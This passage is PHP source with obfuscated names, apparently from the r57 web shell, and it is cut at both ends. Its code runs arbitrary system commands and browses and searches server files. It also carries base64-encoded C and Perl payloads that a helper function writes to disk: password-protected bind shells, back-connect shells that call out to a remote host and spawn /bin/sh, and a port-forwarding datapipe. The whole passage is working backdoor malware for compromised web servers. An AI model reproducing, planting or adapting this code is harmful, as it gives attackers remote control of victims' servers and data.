', $spfd181b); } elseif (function_exists('shell_exec')) { $spfd181b = @shell_exec($spdc9908); } elseif (function_exists('system')) { @ob_start(); @system($spdc9908); $spfd181b = @ob_get_contents(); @ob_end_clean(); } elseif (function_exists('passthru')) { @ob_start(); @passthru($spdc9908); $spfd181b = @ob_get_contents(); @ob_end_clean(); } elseif (@is_resource($sp224638 = @popen($spdc9908, 'r'))) { $spfd181b = ''; while (!@feof($sp224638)) { $spfd181b .= @fread($sp224638, 1024); } @pclose($sp224638); } } return $spfd181b; } echo '[syslog]02
'; function we($sp6c3e91) { if ($sp64e32a['language'] == 'ru') { $sp2583e7 = '??????! ?? ???? ???????? ? ???? '; } else { $sp2583e7 = '[-] ERROR! Can\'t write in file '; } echo '<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#333333><font color=red face=Verdana size=-2><div align=center><b>' . $sp2583e7 . $sp6c3e91 . '</b></div></font></td></tr></table>'; return null; } function re($sp6c3e91) { if ($sp64e32a['language'] == 'ru') { $sp2583e7 = '??????! ?? ???? ????????? ???? '; } else { $sp2583e7 = '[-] ERROR! Can\'t read file '; } echo '<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><font color=red face=Verdana size=-2><div align=center><b>' . $sp2583e7 . $sp6c3e91 . '</b></div></font></td></tr></table>'; return null; } function ce($sp6c3e91) { if ($sp64e32a['language'] == 'ru') { $sp2583e7 = '?? ??????? ??????? '; } else { $sp2583e7 = 'Can\'t create '; } echo '<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><font color=red face=Verdana size=-2><div align=center><b>' . $sp2583e7 . $sp6c3e91 . '</b></div></font></td></tr></table>'; return null; } function perms($sp9dace2) { if ($sp64e32a['windows']) { return 0; } if ($sp9dace2 & 4096) { $spb06e63 = 'p'; } else { if ($sp9dace2 & 8192) { $spb06e63 = 'c'; } else { if ($sp9dace2 & 16384) { $spb06e63 = 'd'; } else { if ($sp9dace2 & 24576) { $spb06e63 = 'b'; } else { if ($sp9dace2 & 32768) { $spb06e63 = '-'; } else { if ($sp9dace2 & 40960) { $spb06e63 = 'l'; } else { if ($sp9dace2 & 49152) { $spb06e63 = 's'; } else { $spb06e63 = 'u'; } } } } } } } $sp0581a1['read'] = $sp9dace2 & 256 ? 'r' : '-'; $sp0581a1['write'] = $sp9dace2 & 128 ? 'w' : '-'; $sp0581a1['execute'] = $sp9dace2 & 64 ? 'x' : '-'; $spbaefbe['read'] = $sp9dace2 & 32 ? 'r' : '-'; $spbaefbe['write'] = $sp9dace2 & 16 ? 'w' : '-'; $spbaefbe['execute'] = $sp9dace2 & 8 ? 'x' : '-'; $spa53dc9['read'] = $sp9dace2 & 4 ? 'r' : '-'; $spa53dc9['write'] = $sp9dace2 & 2 ? 'w' : '-'; $spa53dc9['execute'] = $sp9dace2 & 1 ? 'x' : '-'; if ($sp9dace2 & 2048) { $sp0581a1['execute'] = $sp0581a1['execute'] == 'x' ? 's' : 'S'; } if ($sp9dace2 & 1024) { $spbaefbe['execute'] = $spbaefbe['execute'] == 'x' ? 's' : 'S'; } if ($sp9dace2 & 512) { $spa53dc9['execute'] = $spa53dc9['execute'] == 'x' ? 't' : 'T'; } $sp676578 = sprintf('%1s', $spb06e63); $sp676578 .= sprintf('%1s%1s%1s', $sp0581a1['read'], $sp0581a1['write'], $sp0581a1['execute']); $sp676578 .= sprintf('%1s%1s%1s', $spbaefbe['read'], $spbaefbe['write'], $spbaefbe['execute']); $sp676578 .= sprintf('%1s%1s%1s', $spa53dc9['read'], $spa53dc9['write'], $spa53dc9['execute']); return trim($sp676578); } function in($spb06e63, $sp19dd0c, $sp92ea66, $spc3da4d) { $spe6a02a = '<input type=' . $spb06e63 . ' name=' . $sp19dd0c . ' '; if ($sp92ea66 != 0) { $spe6a02a .= 'size=' . $sp92ea66 . ' '; } $spe6a02a .= 'value="' . $spc3da4d . '">'; return $spe6a02a; } function which($sp518998) { $sp49de29 = ex("which {$sp518998}"); if (!empty($sp49de29)) { return $sp49de29; } else { return $sp518998; } } function cf($spe74d00, $sp2583e7) { $sp00a6a1 = @fopen($spe74d00, 'w') or we($spe74d00); if ($sp00a6a1) { @fputs($sp00a6a1, @base64_decode($sp2583e7)); @fclose($sp00a6a1); } } function sr($sp028b47, $sp3c6a7e, $sp0df63c) { return '<tr class=tr1><td class=td1 width=' . $sp028b47 . '% align=right>' . $sp3c6a7e . '</td><td class=td1 align=left>' . $sp0df63c . '</td></tr>'; } if (!@function_exists('view_size')) { function view_size($sp92ea66) { if ($sp92ea66 >= 1073741824) { $sp92ea66 = @round($sp92ea66 / 1073741824 * 100) / 100 . ' GB'; } elseif ($sp92ea66 >= 1048576) { $sp92ea66 = @round($sp92ea66 / 1048576 * 100) / 100 . ' MB'; } elseif ($sp92ea66 >= 1024) { $sp92ea66 = @round($sp92ea66 / 1024 * 100) / 100 . ' KB'; } else { $sp92ea66 = $sp92ea66 . ' B'; } return $sp92ea66; } } function DirFiles($spa25e24, $sp59f170 = '') { $sp9f4c7d = array(); if ($spc1a0af = @opendir($spa25e24)) { while (FALSE !== ($spa3ecf0 = @readdir($spc1a0af))) { if ($spa3ecf0 != '.' && $spa3ecf0 != '..') { if (!is_dir($spa25e24 . '/' . $spa3ecf0)) { if ($sp59f170) { $sp999b54 = @strrpos($spa3ecf0, '.'); $spe7e244 = @substr($spa3ecf0, $sp999b54, @strlen($spa3ecf0) - $sp999b54); if (@in_array($spe7e244, @explode(';', $sp59f170))) { $sp9f4c7d[] = $spa25e24 . '/' . $spa3ecf0; } } else { $sp9f4c7d[] = $spa25e24 . '/' . $spa3ecf0; } } } } @closedir($spc1a0af); } return $sp9f4c7d; } function DirFilesWide($spa25e24) { $sp9f4c7d = array(); $sp0f92f5 = array(); if ($spc1a0af = @opendir($spa25e24)) { while (false !== ($spa3ecf0 = @readdir($spc1a0af))) { if ($spa3ecf0 != '.' && $spa3ecf0 != '..') { if (@is_dir($spa25e24 . '/' . $spa3ecf0)) { $spa3ecf0 = @strtoupper($spa3ecf0); $sp0f92f5[$spa3ecf0] = '&lt;DIR&gt;'; } else { $sp9f4c7d[$spa3ecf0] = @filesize($spa25e24 . '/' . $spa3ecf0); } } } @closedir($spc1a0af); @ksort($sp0f92f5); @ksort($sp9f4c7d); $sp9f4c7d = @array_merge($sp0f92f5, $sp9f4c7d); } return $sp9f4c7d; } function DirFilesR($spa25e24, $sp59f170 = '') { $sp9f4c7d = array(); if ($spc1a0af = @opendir($spa25e24)) { while (false !== ($spa3ecf0 = @readdir($spc1a0af))) { if ($spa3ecf0 != '.' && $spa3ecf0 != '..') { if (@is_dir($spa25e24 . '/' . $spa3ecf0)) { $sp9f4c7d = @array_merge($sp9f4c7d, DirFilesR($spa25e24 . '/' . $spa3ecf0, $sp59f170)); } else { $sp999b54 = @strrpos($spa3ecf0, '.'); $spe7e244 = @substr($spa3ecf0, $sp999b54, @strlen($spa3ecf0) - $sp999b54); if ($sp59f170) { if (@in_array($spe7e244, explode(';', $sp59f170))) { $sp9f4c7d[] = $spa25e24 . '/' . $spa3ecf0; } } else { $sp9f4c7d[] = $spa25e24 . '/' . $spa3ecf0; } } } } @closedir($spc1a0af); } return $sp9f4c7d; } function DirPrintHTMLHeaders($spa25e24) { $sp55e540 = ''; $spc1a0af = @opendir($spa25e24) or die("Can't open directory {$spa25e24}"); echo '    <ul style=\'margin-left: 0px; padding-left: 20px;\'>
'; while (false !== ($spa3ecf0 = @readdir($spc1a0af))) { if ($spa3ecf0 != '.' && $spa3ecf0 != '..') { if (@is_dir($spa25e24 . '/' . $spa3ecf0)) { echo "      <li><b>[ {$spa3ecf0} ]</b></li>\n"; DirPrintHTMLHeaders($spa25e24 . '/' . $spa3ecf0); } else { $sp999b54 = @strrpos($spa3ecf0, '.'); $spe7e244 = @substr($spa3ecf0, $sp999b54, @strlen($spa3ecf0) - $sp999b54); if (@in_array($spe7e244, array('.htm', '.html'))) { $sp15a4ce = '-=None=-'; $sp17ab9b = @file($spa25e24 . '/' . $spa3ecf0) or die('Can\'t open file ' . $spa25e24 . '/' . $spa3ecf0); for ($sp5955cc = 0; $sp5955cc < count($sp17ab9b); $sp5955cc++) { $spba526a = '(<title>(.+)</title>)'; if (@eregi($spba526a, $sp17ab9b[$sp5955cc], $sp55e540)) { $sp15a4ce = '&laquo;' . $sp55e540[2] . '&raquo;'; break; } } echo '      <li>' . $sp15a4ce . '</li>
'; } } } } echo '    </ul>
'; @closedir($spc1a0af); } class SearchResult { var $text; var $FilesToSearch; var $ResultFiles; var $FilesTotal; var $MatchesCount; var $FileMatschesCount; var $TimeStart; var $TimeTotal; var $titles; function SearchResult($spa25e24, $sp2583e7, $sp146f1b = '') { $sp0f92f5 = @explode(';', $spa25e24); $this->FilesToSearch = array(); for ($sp5955cc = 0; $sp5955cc < count($sp0f92f5); $sp5955cc++) { $this->FilesToSearch = @array_merge($this->FilesToSearch, DirFilesR($sp0f92f5[$sp5955cc], $sp146f1b)); } $this->text = $sp2583e7; $this->FilesTotal = @count($this->FilesToSearch); $this->TimeStart = getmicrotime(); $this->MatchesCount = 0; $this->ResultFiles = array(); $this->FileMatchesCount = array(); $this->titles = array(); } function GetFilesTotal() { return $this->FilesTotal; } function GetTitles() { return $this->titles; } function GetTimeTotal() { return $this->TimeTotal; } function GetMatchesCount() { return $this->MatchesCount; } function GetFileMatchesCount() { return $this->FileMatchesCount; } function GetResultFiles() { return $this->ResultFiles; } function SearchText($sp6c4e8d = 0, $sp828175 = 0) { $sp00b61e = @explode(' ', $this->text); $sp22a17f = '|'; if ($sp6c4e8d) { foreach ($sp00b61e as $sp71a197 => $spe2ff4f) { $sp00b61e[$sp71a197] = '\\b' . $spe2ff4f . '\\b'; } } $sp6b23c0 = '(' . @implode($sp22a17f, $sp00b61e) . ')'; $spba526a = '/' . $sp6b23c0 . '/'; if (!$sp828175) { $spba526a .= 'i'; } foreach ($this->FilesToSearch as $sp71a197 => $spbc6552) { $this->FileMatchesCount[$spbc6552] = 0; $sp151564 = @file($spbc6552) or @next; for ($sp5955cc = 0; $sp5955cc < @count($sp151564); $sp5955cc++) { $sp1eb57e = 0; $spa1037f = $sp151564[$sp5955cc]; $spa1037f = @Trim($spa1037f); $spa1037f = @strip_tags($spa1037f); $sp759b28 = ''; if ($sp1eb57e = @preg_match_all($spba526a, $spa1037f, $sp759b28)) { $spa1037f = @preg_replace($spba526a, '<SPAN style=\'color: #990000;\'><b>\\1</b></SPAN>', $spa1037f); $this->ResultFiles[$spbc6552][$sp5955cc + 1] = $spa1037f; $this->MatchesCount += $sp1eb57e; $this->FileMatchesCount[$spbc6552] += $sp1eb57e; } } } $this->TimeTotal = @round(getmicrotime() - $this->TimeStart, 4); } } function getmicrotime() { list($sp2a42d2, $spb2233d) = @explode(' ', @microtime()); return (double) $sp2a42d2 + (double) $spb2233d; } $sp087a5d = 'I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0='; $spafd163 = 'IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9'; $sp285c88 = 'IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=='; $sp164739 = 'I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ=='; $sp0d4827 = 'I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2
x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb
HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj
aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ
lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm
xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga
W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy
LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV
udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow
0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb
iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l
KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA
gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS
hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC
iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh
ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ
vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC
AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D
QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh
ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0
gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay
wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c
29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy
MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA
gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci
5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ
HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu
dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0
KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC
ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI
E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp
Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs
NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG
J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL
CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp
dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo
gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm
lsZSk7DQogIHJldHVybiAwOw0KfQ=='; $spbe0ae4 = 'IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I
CAgICAgPSAkQVJHVlsxXTsNCiRwb3J0ICAgICAgPSAkQVJHVlsyXTsNCiRkYWVtb249MTsNCiRESVIgPSB1bmRlZjsNCiR8ID0gMTsNCmlmICgkZGFl
bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU
gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol
NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC
iRTSUd7J0NITEQnfSA9ICdJR05PUkUnOw0KJG51bSA9IDA7DQp3aGlsZSAoMSkgeyANCiRjaCA9ICRhaC0+YWNjZXB0KCk7IGlmICghJGNoKSB7IHBy
aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ
SICIkIVxuIjsgfSANCmVsc2lmICgkcGlkID09IDApIHsgJGFoLT5jbG9zZSgpOyBSdW4oXCVvLCAkY2gsICRudW0pOyB9IA0KZWxzZSB7ICRjaC0+Y2
xvc2UoKTsgfQ0KfQ0Kc3ViIFJ1biB7DQpteSgkbywgJGNoLCAkbnVtKSA9IEBfOw0KbXkgJHRoID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KCdQZWVyQ
WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN
CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9
yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi
I7DQp2ZWMoJHJpbiwgZmlsZW5vKCRjaCksIDEpID0gMSBpZiAkY2g7DQp2ZWMoJHJpbiwgZmlsZW5vKCR0aCksIDEpID0gMSBpZiAkdGg7DQpteSgkc
m91dCwgJGVvdXQpOw0Kc2VsZWN0KCRyb3V0ID0gJHJpbiwgdW5kZWYsICRlb3V0ID0gJHJpbiwgMTIwKTsNCmlmICghJHJvdXQgICYmICAhJGVvdXQp
IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ
